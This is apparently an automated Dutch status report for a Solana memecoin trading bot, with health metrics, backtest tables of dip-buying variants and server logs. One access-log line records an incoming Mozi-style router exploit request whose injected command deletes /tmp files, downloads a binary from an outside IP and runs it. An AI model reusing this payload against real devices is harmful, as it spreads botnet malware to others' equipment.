# Schaduwbot status

- tijd: 2026-09-12 13:49:37 UTC
- melding: tick
- host: ubuntu-4gb-fsn1-1 | uptime: up 2 days, 2 minutes
- bot-service: active
- code-versie: 1f31a46
- schijf: 3.6G/38G | geheugen: 653/3814 MB

## Health
```json
{"ok": true, "last_event_age_s": 0.1, "uptime_s": 14237, "tokens_in_memory": 3318, "msgs": 1199182, "trades": 332679, "creates": 3318, "decode_fail": 15435, "rpc_calls": 9693, "rpc_errors": 442, "sol_usd": 101.76279360320098, "open_positions": 52, "log_all_trades": true, "amm_trades": 0, "amm_skip": 0, "amm_actief": false}
```

## Laatste rapport
```

| dag | created | newpairs | final_stretch | screened | screen_pass | entry | exit |
|---|---|---|---|---|---|---|---|
| 2026-09-10 | 14993 | 2145 | 28 | 2144 | 188 | 4138 | 12355 |
| 2026-09-11 | 28511 | 4468 | 41 | 4467 | 369 | 8202 | 24201 |
| 2026-09-12 | 11622 | 1804 | 10 | 1804 | 132 | 3143 | 9403 |

## Varianten (inzet 0,2 SOL, PumpPortal-fees)

| variant | n | winkans | rug% | gem. winst | gem. verlies | EV/trade | maxDD@20% |
|---|---|---|---|---|---|---|---|
| dip35_V1_gescreend_pass | 534 | 16% | 1.9% | +43.9% | -16.4% | -6.44% | 100% |
| dip35_V1_gescreend_fail | 4299 | 27% | 3.8% | +45.5% | -25.9% | -6.59% | 100% |
| dip35_V1_alle | 5312 | 26% | 4.0% | +44.8% | -25.3% | -6.81% | 100% |
| dip35_V2_gescreend_pass | 530 | 23% | 2.6% | +41.9% | -20.9% | -6.65% | 100% |
| dip35_V2_gescreend_fail | 4340 | 25% | 4.3% | +55.7% | -27.9% | -6.87% | 100% |
| dip35_V2_alle | 5269 | 25% | 4.6% | +53.0% | -27.7% | -7.68% | 100% |
| dip35_V3_gescreend_pass | 532 | 9% | 3.0% | +274.0% | -22.2% | +5.04% | 100% |
| dip35_V3_gescreend_fail | 4436 | 14% | 6.0% | +114.3% | -29.6% | -10.15% | 100% |
| dip35_V3_alle | 5324 | 13% | 6.0% | +118.4% | -29.2% | -9.66% | 100% |
| dip40_V1_gescreend_pass | 502 | 14% | 2.0% | +46.0% | -15.7% | -6.87% | 100% |
| dip40_V1_gescreend_fail | 4230 | 26% | 3.8% | +47.1% | -25.7% | -6.53% | 100% |
| dip40_V1_alle | 5105 | 25% | 3.9% | +47.1% | -25.1% | -6.74% | 100% |
| dip40_V2_gescreend_pass | 499 | 18% | 2.4% | +45.1% | -19.8% | -8.26% | 100% |
| dip40_V2_gescreend_fail | 4247 | 25% | 4.2% | +55.3% | -27.9% | -7.01% | 100% |
| dip40_V2_alle | 5058 | 24% | 4.4% | +53.5% | -27.5% | -7.92% | 100% |
| dip40_V3_gescreend_pass | 502 | 8% | 2.6% | +271.2% | -21.1% | +2.73% | 100% |
| dip40_V3_gescreend_fail | 4331 | 13% | 5.8% | +108.3% | -29.4% | -11.22% | 100% |
| dip40_V3_alle | 5112 | 13% | 5.8% | +113.2% | -29.0% | -10.71% | 100% |
| dip45_V1_gescreend_pass | 482 | 15% | 1.9% | +47.7% | -15.6% | -6.30% | 100% |
| dip45_V1_gescreend_fail | 4146 | 27% | 3.4% | +48.4% | -25.5% | -5.22% | 100% |
| dip45_V1_alle | 4942 | 26% | 3.4% | +48.6% | -24.8% | -5.59% | 100% |
| dip45_V2_gescreend_pass | 478 | 19% | 2.3% | +43.1% | -19.8% | -7.94% | 100% |
| dip45_V2_gescreend_fail | 4153 | 25% | 3.9% | +57.9% | -27.5% | -5.80% | 100% |
| dip45_V2_alle | 4896 | 24% | 4.0% | +56.5% | -27.1% | -6.63% | 100% |
| dip45_V3_gescreend_pass | 482 | 8% | 2.3% | +317.5% | -20.6% | +6.07% | 100% |
| dip45_V3_gescreend_fail | 4222 | 14% | 5.4% | +113.4% | -28.9% | -9.07% | 100% |
| dip45_V3_alle | 4941 | 13% | 5.4% | +120.8% | -28.4% | -8.46% | 100% |

## Beste variant: dip45_V3_gescreend_pass

- n>=500: ❌
- winkans>=0.50: ❌
- rug<=0.05: ✅
- ev>=+0.03: ✅
- maxdd20<=0.40: ❌
- Monte Carlo (20% inzet): kans 10.000× 0.1%, kans ruïne 99.9%

## Community-proxy (regel 3, niet als filter — alleen X-link aanwezig ja/nee)

Proxy voor regel 3 uit het bouwplan (community-check): alleen X-link aanwezig ja/nee, niet de daadwerkelijke activiteit. Inzet 0,2 SOL / PumpPortal-fees, alleen gescreend_pass. Let op: 'gepoold' telt elk token één keer per dip%/exit-variant, dus die n is geen aantal onafhankelijke waarnemingen. 'per_token' telt elk token één keer (gemiddelde over zijn varianten) en is de eerlijke steekproefgrootte. Niets hiervan is vooraf vastgelegd.

| groep | n | winkans | rug% | EV/trade | 95%-marge | mediaan | top-3 aandeel van de winst | maxDD@20% |
|---|---|---|---|---|---|---|---|---|
| per_token_met_xlink | 417 | 15% | 5.3% | -9.36% | -12.3% tot -6.4% | -14.6% | – | 100% |
| per_token_zonder_xlink | 120 | 22% | 0.0% | +20.87% | -12.6% tot +54.4% | -13.2% | 123% | 54% |
| gepoold_met_xlink | 3500 | 13% | 3.0% | -10.00% | -11.3% tot -8.7% | -15.2% | – | 100% |
| gepoold_zonder_xlink | 1041 | 19% | 0.0% | +19.81% | +1.0% tot +38.6% | -14.0% | 67% | 100% |

Een EV die grotendeels uit drie trades komt, en een 95%-marge die door nul loopt, zijn geen bewijs van een verschil. Als dit blijft staan, moet het vooraf vastgelegd en op nieuwe tokens getoetst worden.
```

## Bot-log (laatste 80 regels)
```
Sep 12 13:26:13 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:26:13,072 main INFO screen DERP pass=0 dev=0.43 ins=0.0 pro=1 1a=False 1b=False 2=False (6.7s)
Sep 12 13:26:25 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:26:25,981 main INFO screen TNT pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=True 2=True (22.8s)
Sep 12 13:26:36 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:26:36,426 main INFO screen Pnut2 pass=0 dev=0.0 ins=17.05 pro=43 1a=False 1b=False 2=True (3.4s)
Sep 12 13:27:09 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:27:09,003 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:27:14 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:27:14,077 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:27:34 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:27:34,571 main INFO screen box pass=0 dev=0.72 ins=0.0 pro=2 1a=False 1b=False 2=False (9.5s)
Sep 12 13:27:35 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:27:35,622 main INFO screen beer pass=0 dev=0.03 ins=0.0 pro=1 1a=False 1b=False 2=False (26.7s)
Sep 12 13:28:20 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:28:20,371 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:28:32 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:28:32,231 main INFO screen float pass=0 dev=0.0 ins=0.0 pro=1 1a=False 1b=False 2=False (12.0s)
Sep 12 13:28:36 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:28:36,131 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:28:36 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:28:36,493 main INFO screen KOLS pass=1 dev=0.0 ins=18.32 pro=35 1a=False 1b=False 2=False (3.0s)
Sep 12 13:28:47 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:28:47,995 main INFO screen ANONBATON pass=0 dev=0.0 ins=36.03 pro=11 1a=False 1b=False 2=True (12.0s)
Sep 12 13:28:55 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:28:55,400 aiohttp.access INFO 127.0.0.1 [12/Sep/2026:13:28:55 +0000] "GET /health HTTP/1.1" 200 503 "-" "Python-urllib/3.14"
Sep 12 13:29:11 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:29:11,526 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:29:12 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:29:12,893 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:29:18 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:29:18,343 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:29:26 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:29:26,058 main INFO screen $SPRM pass=0 dev=0.05 ins=0.0 pro=1 1a=False 1b=False 2=False (14.6s)
Sep 12 13:29:36 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:29:36,335 main INFO screen ECTF pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=False 2=True (23.5s)
Sep 12 13:29:53 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:29:53,344 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:29:58 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:29:58,359 main INFO screen $CAJUN pass=0 dev=0.5 ins=0.0 pro=3 1a=False 1b=False 2=False (9.9s)
Sep 12 13:29:58 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:29:58,409 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:30:00 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:30:00,657 main INFO screen . pass=0 dev=0.18 ins=0.0 pro=2 1a=False 1b=False 2=False (6.2s)
Sep 12 13:30:10 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:30:10,887 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:30:15 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:30:15,958 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:30:18 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:30:18,473 main INFO screen BetOnBlak pass=0 dev=0.01 ins=0.0 pro=1 1a=False 1b=False 2=True (25.2s)
Sep 12 13:30:31 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:30:31,445 main INFO screen HOLE pass=0 dev=0.0 ins=19.93 pro=62 1a=False 1b=False 2=True (20.8s)
Sep 12 13:31:56 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:31:56,298 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:32:09 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:32:09,502 main INFO screen SCRVAN pass=0 dev=0.0 ins=0.0 pro=1 1a=False 1b=False 2=True (13.3s)
Sep 12 13:32:11 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:32:11,345 main INFO screen float pass=0 dev=0.53 ins=0.0 pro=1 1a=False 1b=False 2=False (7.9s)
Sep 12 13:33:02 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:33:02,807 main INFO screen Hedgehog pass=0 dev=0.0 ins=20.9 pro=57 1a=False 1b=False 2=True (8.5s)
Sep 12 13:33:05 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:33:05,343 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:33:10 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:33:10,430 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:33:25 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:33:25,873 main INFO screen wCAT pass=0 dev=0.0 ins=22.91 pro=48 1a=False 1b=False 2=True (20.6s)
Sep 12 13:34:09 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:34:09,211 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:34:10 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:34:10,506 aiohttp.access INFO 127.0.0.1 [12/Sep/2026:13:34:10 +0000] "GET /health HTTP/1.1" 200 503 "-" "Python-urllib/3.14"
Sep 12 13:34:14 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:34:14,287 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:34:28 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:34:28,819 main INFO screen USGR pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=False 2=True (19.7s)
Sep 12 13:34:47 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:34:47,700 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:34:55 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:34:55,854 main INFO screen float pass=0 dev=0.53 ins=0.0 pro=2 1a=False 1b=False 2=False (8.2s)
Sep 12 13:35:29 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:35:29,680 main INFO screen $CAJUN pass=0 dev=0.5 ins=0.0 pro=4 1a=False 1b=False 2=False (3.0s)
Sep 12 13:36:16 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:36:16,414 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:36:20 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:36:20,266 aiohttp.access INFO 109.197.201.174 [12/Sep/2026:13:36:20 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://109.197.201.174:37107/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 174 "-" "-"
Sep 12 13:36:21 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:36:21,492 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:36:34 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:36:34,756 main INFO screen FLYAURA pass=0 dev=0.35 ins=78.96 pro=6 1a=False 1b=True 2=True (18.4s)
Sep 12 13:37:55 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:37:55,761 main INFO screen Moodeng2 pass=0 dev=6.64 ins=0.0 pro=38 1a=False 1b=False 2=False (3.3s)
Sep 12 13:39:10 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:39:10,753 aiohttp.access INFO 127.0.0.1 [12/Sep/2026:13:39:10 +0000] "GET /health HTTP/1.1" 200 502 "-" "Python-urllib/3.14"
Sep 12 13:39:14 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:39:14,773 main INFO screen CORINNA pass=0 dev=0.21 ins=0.0 pro=2 1a=False 1b=False 2=True (1.8s)
Sep 12 13:39:18 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:39:18,800 main INFO screen . pass=0 dev=0.35 ins=0.0 pro=3 1a=False 1b=False 2=False (3.7s)
Sep 12 13:40:26 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:40:26,579 main INFO screen $STAIRS pass=0 dev=0.29 ins=0.0 pro=1 1a=False 1b=False 2=False (2.3s)
Sep 12 13:41:42 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:41:42,345 main INFO screen CORINNA pass=0 dev=0.23 ins=0.0 pro=3 1a=False 1b=False 2=False (3.0s)
Sep 12 13:41:57 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:41:57,836 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:42:04 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:42:04,902 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:42:06 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:42:06,462 main INFO screen pac pass=0 dev=0.21 ins=0.0 pro=3 1a=False 1b=False 2=False (8.7s)
Sep 12 13:42:09 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:42:09,974 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:42:24 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:42:24,135 main INFO screen FTFS pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=True 2=True (19.9s)
Sep 12 13:42:39 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:42:39,208 main INFO screen DOGE  pass=0 dev=0.28 ins=0.0 pro=1 1a=False 1b=False 2=False (2.5s)
Sep 12 13:42:43 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:42:43,985 main INFO screen Henry pass=0 dev=16.91 ins=0.96 pro=42 1a=False 1b=False 2=False (3.2s)
Sep 12 13:42:50 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:42:50,438 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:42:55 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:42:55,506 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:43:09 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:43:09,607 main INFO screen REXLER pass=0 dev=0.0 ins=0.0 pro=2 1a=False 1b=False 2=True (19.2s)
Sep 12 13:43:19 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:43:19,494 main INFO screen BPCATE pass=0 dev=0.25 ins=0.0 pro=2 1a=False 1b=False 2=False (3.1s)
Sep 12 13:43:21 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:43:21,247 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:43:21 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:43:21,898 main INFO screen . pass=0 dev=0.18 ins=0.0 pro=2 1a=False 1b=False 2=False (2.8s)
Sep 12 13:43:26 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:43:26,317 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:43:39 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:43:39,573 main INFO screen DATADOG pass=0 dev=3.42 ins=75.89 pro=2 1a=False 1b=True 2=True (18.6s)
Sep 12 13:43:48 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:43:48,892 main INFO screen Sherwood pass=1 dev=0.0 ins=16.46 pro=24 1a=False 1b=False 2=False (3.9s)
Sep 12 13:43:57 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:43:57,383 main INFO screen KDAY pass=0 dev=0.0 ins=0.0 pro=3 1a=False 1b=False 2=False (3.3s)
Sep 12 13:44:05 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:44:05,041 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:44:10 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:44:10,110 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:44:25 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:44:25,508 main INFO screen SOL pass=0 dev=0.0 ins=21.99 pro=57 1a=False 1b=False 2=True (20.5s)
Sep 12 13:44:27 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:44:27,144 aiohttp.access INFO 127.0.0.1 [12/Sep/2026:13:44:27 +0000] "GET /health HTTP/1.1" 200 503 "-" "Python-urllib/3.14"
Sep 12 13:45:26 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:45:26,525 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:45:35 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:45:35,924 main INFO screen Celebrity pass=0 dev=0.0 ins=20.97 pro=60 1a=False 1b=False 2=False (9.5s)
Sep 12 13:45:36 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:45:36,133 main INFO screen PAPERBAG pass=0 dev=0.0 ins=21.4 pro=33 1a=False 1b=False 2=True (2.5s)
Sep 12 13:47:35 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:47:35,216 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:47:40 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:47:40,249 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 12 13:47:53 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:47:53,510 main INFO screen anonwjak pass=0 dev=0.07 ins=79.24 pro=9 1a=False 1b=True 2=True (18.4s)
Sep 12 13:48:03 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:48:03,986 main INFO screen Celebrity pass=0 dev=0.35 ins=0.0 pro=4 1a=False 1b=False 2=False (3.1s)
Sep 12 13:49:26 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:49:26,992 main INFO screen fg pass=0 dev=0.35 ins=0.0 pro=3 1a=False 1b=False 2=False (3.5s)
Sep 12 13:49:37 ubuntu-4gb-fsn1-1 python[67492]: 2026-09-12 13:49:37,153 aiohttp.access INFO 127.0.0.1 [12/Sep/2026:13:49:37 +0000] "GET /health HTTP/1.1" 200 503 "-" "Python-urllib/3.14"
```

## Update-log (laatste 20 regels)
```
--- update 2026-09-12T12:31:17Z
--- update 2026-09-12T12:36:23Z
--- update 2026-09-12T12:41:36Z
--- update 2026-09-12T12:47:05Z
--- update 2026-09-12T12:52:10Z
--- update 2026-09-12T12:57:36Z
--- update 2026-09-12T13:02:55Z
nieuwe code: 1f31a46
alleen analyses/documentatie gewijzigd: geen herstart
Running as unit: schaduwbot-wallets.service; invocation ID: 88310e2f16cc42c39aad06b1953b4bf1
analyses gestart (83a2a6960268)
--- update 2026-09-12T13:08:11Z
--- update 2026-09-12T13:13:29Z
--- update 2026-09-12T13:18:36Z
--- update 2026-09-12T13:23:41Z
--- update 2026-09-12T13:28:54Z
--- update 2026-09-12T13:34:09Z
--- update 2026-09-12T13:39:09Z
--- update 2026-09-12T13:44:26Z
--- update 2026-09-12T13:49:36Z
```

## Analyses (laatste 25 regels)
```
inactive
13:12:48 klaar in 2s: 17367 tokens, 891 nieuw -> /opt/schaduwbot/reports/video_replay.md
13:12:48 wallet-analyse start /opt/schaduwbot/data/schaduwbot.sqlite since 2026-09-09 13:12 UTC
13:12:48 55478 tokens geladen
13:12:51   2000 tokens, 249962 trades, 50569 posities (2s)
13:12:53   4000 tokens, 493968 trades, 97416 posities (4s)
13:12:55   6000 tokens, 732147 trades, 142845 posities (6s)
13:12:57   8000 tokens, 964228 trades, 186079 posities (8s)
13:12:58   10000 tokens, 1201571 trades, 229531 posities (10s)
13:13:01   12000 tokens, 1476021 trades, 287458 posities (13s)
13:13:04   14000 tokens, 1723248 trades, 333950 posities (15s)
13:13:06   16000 tokens, 1964033 trades, 376676 posities (17s)
13:13:08   18000 tokens, 2217916 trades, 427570 posities (20s)
13:13:10   20000 tokens, 2455968 trades, 473450 posities (22s)
13:13:12   22000 tokens, 2717056 trades, 523961 posities (23s)
13:13:14   24000 tokens, 2956310 trades, 567769 posities (25s)
13:13:16   26000 tokens, 3200796 trades, 614853 posities (27s)
13:13:18   28000 tokens, 3423421 trades, 657040 posities (29s)
13:13:20   30000 tokens, 3683712 trades, 705965 posities (31s)
13:13:22   32000 tokens, 3941796 trades, 764610 posities (33s)
13:13:22 posities: 788267 uit 4042689 trades (34s)
13:13:32 166368 wallets gerekend
13:13:33 geluk-toets
13:14:04 persistentie
13:14:06 kopieer-simulatie
13:14:17 klaar in 89s -> /opt/schaduwbot/reports/wallets.md
```

## Bootstrap-log (laatste 60 regels)
```
Unpacking libcurl4t64:amd64 (8.18.0-1ubuntu2.5) over (8.18.0-1ubuntu2.4)…
Preparing to unpack …/08-libcurl3t64-gnutls_8.18.0-1ubuntu2.5_amd64.deb…
Unpacking libcurl3t64-gnutls:amd64 (8.18.0-1ubuntu2.5) over (8.18.0-1ubuntu2.4)…
Selecting previously unselected package python3-wheel.
Preparing to unpack …/09-python3-wheel_0.46.3-2_all.deb…
Unpacking python3-wheel (0.46.3-2)…
Selecting previously unselected package python3-pip.
Preparing to unpack …/10-python3-pip_25.1.1+dfsg-1ubuntu2_all.deb…
Unpacking python3-pip (25.1.1+dfsg-1ubuntu2)…
Selecting previously unselected package python3-pip-whl.
Preparing to unpack …/11-python3-pip-whl_25.1.1+dfsg-1ubuntu2_all.deb…
Unpacking python3-pip-whl (25.1.1+dfsg-1ubuntu2)…
Selecting previously unselected package python3-setuptools-whl.
Preparing to unpack …/12-python3-setuptools-whl_78.1.1-0.1build1_all.deb…
Unpacking python3-setuptools-whl (78.1.1-0.1build1)…
Selecting previously unselected package python3.14-venv.
Preparing to unpack …/13-python3.14-venv_3.14.4-1ubuntu0.2_amd64.deb…
Unpacking python3.14-venv (3.14.4-1ubuntu0.2)…
Selecting previously unselected package python3-venv.
Preparing to unpack …/14-python3-venv_3.14.3-0ubuntu2_amd64.deb…
Unpacking python3-venv (3.14.3-0ubuntu2)…
Setting up python3-setuptools-whl (78.1.1-0.1build1)…
Setting up libcurl4t64:amd64 (8.18.0-1ubuntu2.5)…
Setting up python3-pip-whl (25.1.1+dfsg-1ubuntu2)…
Setting up libpython3.14-minimal:amd64 (3.14.4-1ubuntu0.2)…
Setting up libcurl3t64-gnutls:amd64 (8.18.0-1ubuntu2.5)…
Setting up python3-wheel (0.46.3-2)…
Setting up python3.14-gdbm (3.14.4-1ubuntu0.2)…
Setting up python3-pip (25.1.1+dfsg-1ubuntu2)…
Setting up curl (8.18.0-1ubuntu2.5)…
Setting up python3.14-minimal (3.14.4-1ubuntu0.2)…
Setting up libpython3.14-stdlib:amd64 (3.14.4-1ubuntu0.2)…
Setting up libpython3.14:amd64 (3.14.4-1ubuntu0.2)…
Setting up python3.14 (3.14.4-1ubuntu0.2)…
Setting up python3.14-venv (3.14.4-1ubuntu0.2)…
Setting up python3-venv (3.14.3-0ubuntu2)…
Processing triggers for systemd (259.5-0ubuntu3.4)…
Processing triggers for man-db (2.13.1-1build1)…
Processing triggers for libc-bin (2.43-2ubuntu2.3)…

Running kernel seems to be up-to-date.

Restarting services...
 systemctl restart packagekit.service

Service restarts being deferred:
 systemctl restart cloud-init-main.service
 systemctl restart networkd-dispatcher.service
 systemctl restart unattended-upgrades.service

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
Created symlink '/etc/systemd/system/multi-user.target.wants/schaduwbot.service' → '/etc/systemd/system/schaduwbot.service'.
install klaar
status.md -> 200 
report.json -> 201 
===== bootstrap klaar 2026-09-10T13:48:49Z =====
```

## cloud-init (laatste 25 regels)
```
|.BoBoB.          |
|  o.. +E         |
| .   .. S .      |
|.    . o =       |
| .  . + + .      |
| .+o . . o       |
| .**.            |
+----[SHA256]-----+
Generating public/private ed25519 key pair.
Your identification has been saved in /etc/ssh/ssh_host_ed25519_key
Your public key has been saved in /etc/ssh/ssh_host_ed25519_key.pub
The key fingerprint is:
SHA256:w2XLkdz/wp4oYdhzAWpZtAWfv0pFj8xAggp36PYfUQQ root@ubuntu-4gb-fsn1-1
The key's randomart image is:
+--[ED25519 256]--+
|       . oE++    |
|    . o o.oO..   |
|     + o +Bo= .  |
|      +.++.o.B o |
|     . oSoo. .B .|
|        o.* .o o |
|         o =. + .|
|          o. + o |
|           .o o  |
+----[SHA256]-----+
```
